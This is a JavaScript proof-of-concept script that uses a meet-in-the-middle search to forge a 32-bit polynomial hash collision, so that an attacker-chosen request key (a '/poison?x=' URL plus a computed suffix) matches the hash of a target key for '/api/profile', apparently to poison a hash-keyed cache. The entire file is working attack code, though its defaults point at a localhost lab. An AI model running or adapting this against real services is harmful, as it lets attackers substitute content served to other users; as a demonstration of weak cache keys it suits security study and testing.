function rawHash(value) {
  let hash = 0;
  for (const char of value) {
    hash = (Math.imul(31, hash) + char.charCodeAt(0)) | 0;
  }
  return hash >>> 0;
}

function pow31(n) {
  let power = 1 >>> 0;
  for (let i = 0; i < n; i++) {
    power = Math.imul(power, 31) >>> 0;
  }
  return power >>> 0;
}

function inversePow31(n) {
  const inverse31 = 3186588639;
  let power = 1 >>> 0;
  for (let i = 0; i < n; i++) {
    power = Math.imul(power, inverse31) >>> 0;
  }
  return power >>> 0;
}

function modSub(a, b) {
  return (a - b) >>> 0;
}

function modMul(a, b) {
  return Math.imul(a, b) >>> 0;
}

function enumerate(alphabet, length, callback, prefix = '') {
  if (length === 0) {
    callback(prefix);
    return;
  }
  for (const char of alphabet) {
    enumerate(alphabet, length - 1, callback, prefix + char);
  }
}

const attackerPrefix =
  process.argv[2] ?? 'GET|text|http://127.0.0.1:4218/poison?x=';
const targetKey = process.argv[3] ?? 'GET|text|http://127.0.0.1:4218/api/profile||';
const tail = process.argv[4] ?? '||';
const alphabet = process.argv[5] ?? 'abcdefghijklmnopqrstuvwxyz0123456789';
const leftLength = Number(process.argv[6] ?? 4);
const rightLength = Number(process.argv[7] ?? 4);

const suffixLength = leftLength + rightLength;
const targetHash = rawHash(targetKey);
const attackerPrefixHash = rawHash(attackerPrefix);
const basePart = modMul(attackerPrefixHash, pow31(suffixLength + tail.length));
const tailHash = rawHash(tail);
const neededSuffixPoly = modMul(
  modSub(modSub(targetHash, basePart), tailHash),
  inversePow31(tail.length),
);

const rightPower = pow31(rightLength);
const leftMap = new Map();

enumerate(alphabet, leftLength, (left) => {
  leftMap.set(modMul(rawHash(left), rightPower), left);
});

enumerate(alphabet, rightLength, (right) => {
  const neededLeft = modSub(neededSuffixPoly, rawHash(right));
  const left = leftMap.get(neededLeft);
  if (left !== undefined) {
    const suffix = left + right;
    const attackerKey = attackerPrefix + suffix + tail;
    console.log(
      JSON.stringify(
        {
          suffix,
          attackerKey,
          targetKey,
          rawHash: targetHash,
          finalStateKey: (targetHash + 2147483648).toString(),
          verify: rawHash(attackerKey) === targetHash,
        },
        null,
        2,
      ),
    );
    process.exit(0);
  }
});

console.error('No collision found');
process.exit(1);
